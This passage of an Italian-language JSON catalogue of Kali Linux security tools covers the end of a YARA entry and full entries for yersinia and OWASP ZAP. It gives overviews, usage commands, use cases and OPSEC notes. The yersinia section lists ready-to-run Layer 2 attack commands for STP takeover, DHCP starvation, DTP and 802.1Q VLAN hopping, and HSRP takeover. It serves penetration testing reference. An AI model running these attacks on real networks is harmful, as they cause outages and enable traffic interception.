rule.yar -p &lt;pid&gt;\n\n# Con timeout per regole complesse\nyara -a 60 complex_rule.yar large_file\n\n# Compilare regole per performance\nyarac rules/ compiled.yarc\nyara -C compiled.yarc samples/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Detection &amp; Classification</strong>, identificare e categorizzare sample malware noti e varianti tramite signature custom, supportando triage automatizzato in ambienti di analisi.</p><p>Per <strong>Threat Hunting Proattivo</strong>, cercare indicatori di compromissione su filesystem, memoria e network capture usando regole basate su threat intelligence per identificare intrusioni attive.</p><p>Per <strong>Incident Response</strong>, classificare rapidamente malware trovato durante investigazioni forensi, correlando sample con famiglie note e campagne APT documentate.</p><p>Per <strong>Threat Intelligence Sharing</strong>, condividere signature di detection con la community attraverso repository come YARA-Rules, enabling difesa collaborativa contro threat emergenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> YARA è un tool di analisi locale che non genera traffico di rete durante la scansione. Le regole possono essere condivise pubblicamente per detection collaborativa ma attenzione a non rivelare indicatori sensibili. Performance dipende da complessità delle regole e volume di file - ottimizzare regole per ambiente production. Considerare implicazioni privacy quando si scansionano sistemi di terze parti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "yersinia",
    "name": "yersinia",
    "version": "0.8.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/yersinia/",
    "desc": "Attacchi layer 2: STP, CDP, DTP, DHCP, 802.1Q per VLAN hopping e network takeover.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Yersinia</strong> è un framework specializzato per attacchi Layer 2 che sfrutta debolezze intrinseche nei protocolli di rete a livello data link. Supporta attacchi completi su STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP (Hot Standby Router Protocol), 802.1Q, VTP e altri protocolli per VLAN hopping, network takeover, MITM e denial of service. È uno strumento essenziale per network penetration testing che evidenzia vulnerabilità spesso ignorate nelle configurazioni switch.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>STP Root Bridge Attack:</strong> invia BPDU con priority inferiore per diventare root bridge della rete, causando ricalcolo della topologia e permettendo intercettazione di tutto il traffico switched che ora transita attraverso l'attaccante.</p><p><strong>DTP Trunk Negotiation:</strong> negozia automaticamente una connessione trunk con switch Cisco configurati in modalità dynamic, ottenendo accesso a tutte le VLAN configurate e bypassando la segmentazione di rete.</p><p><strong>DHCP Starvation &amp; Rogue Server:</strong> esaurisce il pool di indirizzi DHCP legittimo tramite flood di DHCP Discover, poi risponde come rogue DHCP server per assegnare gateway malevolo e intercettare traffico client.</p><p><strong>CDP/LLDP Discovery &amp; Spoofing:</strong> cattura informazioni di discovery per mappare topologia di rete, poi esegue spoofing per impersonare dispositivi o flooding per causare DoS su switch vulnerabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI interattiva ncurses\nyersinia -I\n\n# Avvia GUI GTK (se disponibile)\nyersinia -G\n\n# STP root bridge attack da CLI\nyersinia stp -attack 1 -interface eth0\n\n# DHCP starvation (esaurimento pool)\nyersinia dhcp -attack 1 -interface eth0\n\n# DTP trunk negotiation attack\nyersinia dtp -attack 1 -interface eth0\n\n# CDP flooding attack\nyersinia cdp -attack 1 -interface eth0\n\n# HSRP takeover (become active router)\nyersinia hsrp -attack 1 -interface eth0\n\n# 802.1Q double tagging VLAN hopping\nyersinia 8021q -attack 1 -interface eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Infrastructure Pentesting</strong>, testare la sicurezza delle configurazioni switch e la resistenza della rete ad attacchi Layer 2, identificando misconfiguration comuni come DTP enabled e STP non protetto.</p><p>Per <strong>VLAN Segmentation Bypass</strong>, verificare l'efficacia della segmentazione VLAN tentando VLAN hopping via DTP trunk negotiation o 802.1Q double tagging.</p><p>Per <strong>Network MITM Positioning</strong>, ottenere posizione man-in-the-middle diventando root bridge STP o rogue DHCP/gateway per intercettare traffico di rete.</p><p>Per <strong>Redundancy Protocol Testing</strong>, testare sicurezza di protocolli di ridondanza come HSRP, VRRP verificando possibilità di takeover del gateway attivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attacchi Layer 2 causano anomalie immediate facilmente rilevabili da network monitoring e SIEM. STP topology change genera log e alert su tutti gli switch managed. DHCP starvation è estremamente visibile nei log DHCP server. CDP/LLDP flooding può causare crash di switch vulnerabili. CRITICO: questi attacchi possono causare disruption di rete significativa e outage - usare solo in ambiente di test isolato o con autorizzazione esplicita e finestre di manutenzione concordate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "zaproxy",
    "name": "zaproxy",
    "version": "2.16.1",
    "icon": "../app/icons/zaproxy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/zaproxy/",
    "desc": "OWASP ZAP: proxy intercettante, scanner vulnerabilità web, fuzzer e spider automatico.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OWASP ZAP (Zed Attack Proxy) è uno degli scanner di sicurezza web open source più popolari e completi al mondo, mantenuto da OWASP Foundation. Combina proxy intercettante avanzato, scanner automatico di vulnerabilità con detection per OWASP Top 10, fuzzer potente, spider intelligente, API REST completa e sistema di plugin estensibile. È lo strumento di riferimento per web application security testing sia manuale che automatizzato, utilizzato da penetration tester, sviluppatori e team DevSecOps.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intercepting Proxy:</strong> cattura e modifica request/response HTTP/HTTPS in tempo reale con supporto WebSocket, breakpoint condizionali, replay di request e history searchable per analisi manuale approfondita del traffico applicativo.</p><p><strong>Active &amp; Passive Scanner:</strong> identifica vulnerabilità automaticamente attraverso scanning passivo (analisi del traffico) e attivo (injection di payload). Rileva SQL injection, XSS, path traversal, CSRF, security misconfiguration e tutte le vulnerabilità OWASP Top 10.</p><p><strong>Intelligent Spider:</strong> crawling automatico avanzato con supporto JavaScript rendering, form submission, session handling e AJAX spider per mappare completamente applicazioni web moderne incluse SPA React/Angular/Vue.</p><p><strong>Advanced Fuzzer:</strong> testing con payload custom su qualsiasi parte della request (parametri, header, body, path) con supporto per file di payload, generatori e encoding automatico per vulnerability discovery.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia ZAP GUI\nzaproxy\n\n# Quick scan completo da CLI\nzap-cli quick-scan -s all -r https://target.com\n\n# Spider dell'applicazione\nzap-cli spider https://target.com\n\n# Active scan dopo spider\nzap-cli active-scan https://target.com\n\n# Genera report HTML\nzap-cli report -o report.html -f html\n\n# Headless mode per CI/CD\nzap.sh -daemon -port 8080 -config api.disablekey=true\n\n# Scan con autenticazione\nzap-cli --zap-url http://127.0.0.1:8080 active-scan -c auth_context https://target.com\n\n# API scan per OpenAPI/Swagger\nzap-api-scan.py -t https://target.com/api/openapi.json -f openapi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Pentesting</strong>, condurre assessment completo di sicurezza su applicazioni web identificando vulnerabilità OWASP Top 10, business logic flaw e misconfiguration.</p><p>Per <strong>DevSecOps CI/CD Integration</strong>, integrare scanning automatico nelle pipeline di sviluppo con ZAP in modalità daemon, API REST e plugin per Jenkins, GitLab CI, GitHub Actions.</p><p>Per <strong>Manual Security Testing</strong>, utilizzare il proxy intercettante per analisi dettagliata di funzionalità specifiche, testing di autenticazione, authorization bypass e session management.</p><p>Per <strong>API Security Testing</strong>, testare sicurezza di REST API importando specifiche OpenAPI/Swagger per coverage automatica degli endpoint.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> active scan genera traffico con pattern di attacco evidenti facilmente identificabili da WAF e IDS. Lo spider può triggare rate limiting e generare alert per accesso anomalo. Request con payload di injection sono loggate. Usare passive scan e spider delicato per ridurre rumore durante reconnaissance, riservando active scan per finestre concordate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  }
]